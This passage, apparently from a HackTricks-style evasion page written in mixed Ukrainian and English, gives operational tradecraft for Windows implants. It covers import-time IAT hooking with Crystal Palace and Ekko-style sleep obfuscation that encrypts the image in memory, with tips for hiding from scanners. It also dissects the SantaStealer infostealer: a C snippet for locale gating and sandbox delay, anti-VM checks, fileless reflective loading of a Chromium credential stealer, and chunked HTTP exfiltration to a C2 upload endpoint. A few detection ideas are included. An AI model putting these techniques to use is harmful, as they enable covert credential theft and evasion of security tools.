- Image‑load evasion: якщо хукати LoadLibrary*, моніторте підозрілі завантаження automation/clr assemblies, корельовані з memory masking подіями.

Related building blocks and examples
- Reflective loaders, які виконують IAT patching під час load (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Якщо ви контролюєте reflective loader, можна хукати імпорти під час `ProcessImports()` шляхом заміни вказівника loader'а `GetProcAddress` на кастомний резольвер, який спочатку перевіряє hooks:

- Побудуйте **resident PICO** (persistent PIC object), що виживає після того, як transient loader PIC звільнить себе.
- Export'уйте функцію `setup_hooks()`, яка перезаписує import resolver loader'а (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- В `_GetProcAddress` пропускайте ordinal imports і використовуйте hash‑based hook lookup типу `__resolve_hook(ror13hash(name))`. Якщо hook існує — поверніть його; інакше делегуйте реальному `GetProcAddress`.
- Реєструйте цілі hook'ів на link time за допомогою Crystal Palace `addhook "MODULE$Func" "hook"` записів. Hook залишається валідним, бо живе всередині resident PICO.

Це дає **import-time IAT redirection** без патчингу code section завантаженого DLL після load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks спрацьовують лише якщо функція реально присутня в IAT цілі. Якщо модуль резолвить APIs через PEB-walk + hash (без import entry), змусьте реальний імпорт, щоб шлях `ProcessImports()` loader'а його побачив:

- Замініть hashed export resolution (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання типу `&WaitForSingleObject`.
- Компілятор емісує IAT запис, що дозволяє перехоплення під час того, як reflective loader резолвить imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Замість патчингу `Sleep`, хукайте фактичні wait/IPC примітиви, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для довгих очікувань обгорніть виклик в Ekko-style obfuscation chain, який шифрує in‑memory image під час idle:

- Використовуйте `CreateTimerQueueTimer` щоб запланувати послідовність callbacks, які викликають `NtContinue` з crafted `CONTEXT` фреймами.
- Типовий chain (x64): встановити image в `PAGE_READWRITE` → RC4 encrypt через `advapi32!SystemFunction032` по всьому mapped image → виконати blocking wait → RC4 decrypt → відновити per‑section permissions, обходячи PE sections → сигналізувати про завершення.
- `RtlCaptureContext` дає template `CONTEXT`; клонувати його в кілька фреймів і встановити регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для довгих очікувань (наприклад, `WAIT_OBJECT_0`), щоб викликач продовжував роботу, поки image замаскований. Цей патерн ховає модуль від сканерів під час idle вікон і уникає класичного сигнатурного сліду “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Сплески `CreateTimerQueueTimer` callbacks, що вказують на `NtContinue`.
- `advapi32!SystemFunction032` використаний на великих суцільних буферах розміру image.
- VirtualProtect на великому діапазоні, за яким слідує власне відновлення per‑section permissions.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

### Keyboard layout gating & sandbox delay

- Конфіг прапорець (`anti_cis`) перелічує встановлені keyboard layouts через `GetKeyboardLayoutList`. Якщо знайдено Cyrillic layout, семпл скидає порожній `CIS` marker і завершує роботу до запуску stealers, гарантувавши, що він ніколи не детонує на виключених локалях, лишаючи артефакт для hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева логіка `check_antivm`

- Варіант A перебирає список процесів, хешує кожне ім'я за допомогою власного rolling checksum і порівнює його з вбудованими blocklists для debuggers/sandboxes; він повторює checksum для імені комп'ютера і перевіряє робочі каталоги, такі як `C:\analysis`.
- Варіант B інспектує системні властивості (process-count floor, recent uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleeps, щоб виявити single-stepping. Будь-який збіг приводить до переривання до запуску модулів.

### Fileless helper + подвійне ChaCha20 reflective loading

- Основний DLL/EXE вбудовує Chromium credential helper, який або скидається на диск, або вручну відмаплюється в пам'яті; у fileless mode він сам вирішує imports/relocations, тож жодних артефактів helper не записується на диск.
- Цей helper зберігає DLL другої стадії, зашифровану двічі ChaCha20 (двома 32-byte keys + 12-byte nonces). Після обох проходів він reflectively loads the blob (no `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, запозичені з [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для ін'єкції в живий Chromium browser, успадковують AppBound Encryption keys і дешифрують passwords/cookies/credit cards безпосередньо з SQLite databases, незважаючи на ABE hardening.

### Модульний збір в пам'яті та chunked HTTP exfil

- `create_memory_based_log` ітерує глобальну таблицю вказівників функцій `memory_generators` і створює по одному потоку на увімкнений модуль (Telegram, Discord, Steam, screenshots, documents, browser extensions тощо). Кожен потік записує результати у спільні буфери і повідомляє кількість файлів після ~45s join window.
- Після завершення все архівується за допомогою статично лінкованої бібліотеки `miniz` як `%TEMP%\\Log.zip`. `ThreadPayload1` потім спить 15s і стрімить архів у 10 MB чанках через HTTP POST на `http://<C2>:6767/upload`, підробляючи browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, опційно `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що збирання завершено.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
